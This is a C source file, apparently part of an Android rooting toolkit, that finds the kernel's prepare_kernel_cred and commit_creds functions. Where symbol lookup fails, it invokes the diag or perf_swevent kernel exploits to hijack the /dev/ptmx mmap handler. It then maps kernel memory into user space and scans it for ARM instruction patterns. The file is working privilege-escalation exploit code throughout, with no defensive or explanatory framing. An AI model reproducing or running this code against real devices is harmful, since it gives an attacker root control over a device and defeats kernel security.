#include <errno.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

#include "cred.h"
#include "mm.h"
#include "ptmx.h"
#include "libdiagexploit/diag.h"
#include "kallsyms.h"
#include "libperf_event_exploit/perf_event.h"
#include "device_database/device_database.h"

static bool
get_creds_functions_addresses(void **prepare_kernel_cred_address, void **commit_creds_address)
{
  *prepare_kernel_cred_address = (void *)device_get_symbol_address(DEVICE_SYMBOL(prepare_kernel_cred));
  *commit_creds_address = (void*)device_get_symbol_address(DEVICE_SYMBOL(commit_creds));

  if (*prepare_kernel_cred_address && *commit_creds_address) {
    return true;
  }

  print_reason_device_not_supported();

  return false;
}

static uint32_t PAGE_OFFSET = 0xC0000000;

static void *
convert_to_kernel_address(void *address, void *mmap_base_address)
{
  return address - mmap_base_address + (void*)PAGE_OFFSET;
}

static void *
convert_to_mmaped_address(void *address, void *mmap_base_address)
{
  return mmap_base_address + (address - (void*)PAGE_OFFSET);
}

static uint32_t prepare_kernel_cred_asm[] = { 0xe59f30bc, 0xe3a010d0, 0xe92d4070, 0xe1a04000 };
static size_t prepare_kernel_cred_asm_length = sizeof(prepare_kernel_cred_asm);
static void *
find_prepare_kernel_cred(void *mem, size_t length)
{
  void *prepare_kernel_cred;

  prepare_kernel_cred = memmem(mem, length, &prepare_kernel_cred_asm, prepare_kernel_cred_asm_length);
  if (!prepare_kernel_cred) {
    printf("Couldn't find prepare_kernel_cred address\n");
    return NULL;
  }

  return prepare_kernel_cred;
}

static uint32_t commit_creds_asm[] = { 0xe92d4070, 0xe1a0200d, 0xe3c23d7f, 0xe1a05000 };
static size_t commit_creds_asm_length = sizeof(prepare_kernel_cred_asm);
static void *
find_commit_creds(void *mem, size_t length)
{
  void *commit_creds;

  commit_creds = memmem(mem, length, &commit_creds_asm, commit_creds_asm_length);
  if (!commit_creds) {
    printf("Couldn't find commit_creds address\n");
    return NULL;
  }

  return commit_creds;
}

#define KERNEL_SIZE 0x10000000

static bool
find_creds_functions_with_mmap(void *user_data)
{
  int fd;
  void *address;
  void *start_address = (void*) 0x10000000;

  fd = open(PTMX_DEVICE, O_RDWR);
  address = mmap(start_address, KERNEL_SIZE,
                 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED,
                 fd, 0);
  if (address == MAP_FAILED) {
    printf("Failed to mmap /dev/ptmx due to %s.\n", strerror(errno));
    close(fd);
    return false;
  }

  prepare_kernel_cred = find_prepare_kernel_cred(address, KERNEL_SIZE);
  if (prepare_kernel_cred) {
    commit_creds = find_commit_creds(prepare_kernel_cred + 4, KERNEL_SIZE);

    prepare_kernel_cred = convert_to_kernel_address(prepare_kernel_cred, address);
    commit_creds = convert_to_kernel_address(commit_creds, address);
  }

  munmap(address, KERNEL_SIZE);

  close(fd);

  return prepare_kernel_cred && commit_creds;
}

static bool
find_with_diag_exploit(unsigned int ptmx_mmap_address)
{
  struct diag_values injection_data;

  injection_data.address = ptmx_mmap_address;
  injection_data.value = (uint16_t)&ptmx_mmap;

  return diag_run_exploit(&injection_data, 1,
                          find_creds_functions_with_mmap, NULL);
}

static bool
find_with_perf_swevent_exploit(unsigned int ptmx_mmap_address)
{
  return perf_swevent_run_exploit(ptmx_mmap_address, (int)&ptmx_mmap,
                                  find_creds_functions_with_mmap, NULL);
}

static bool
find_creds_functions_in_memory(void)
{
  unsigned long int ptmx_mmap_address;

  ptmx_mmap_address = get_ptmx_fops_address() + 0x28;

  if (diag_is_supported()) {
    return find_with_diag_exploit(ptmx_mmap_address);
  }
  return find_with_perf_swevent_exploit(ptmx_mmap_address);
}

bool
setup_creds_functions(void)
{
  if (kallsyms_exist()) {
    prepare_kernel_cred = kallsyms_get_symbol_address("prepare_kernel_cred");
    commit_creds = kallsyms_get_symbol_address("commit_creds");
    return true;
  }

  if (get_creds_functions_addresses((void**)&prepare_kernel_cred, (void**)&commit_creds)) {
    return true;
  }

  return find_creds_functions_in_memory();
}

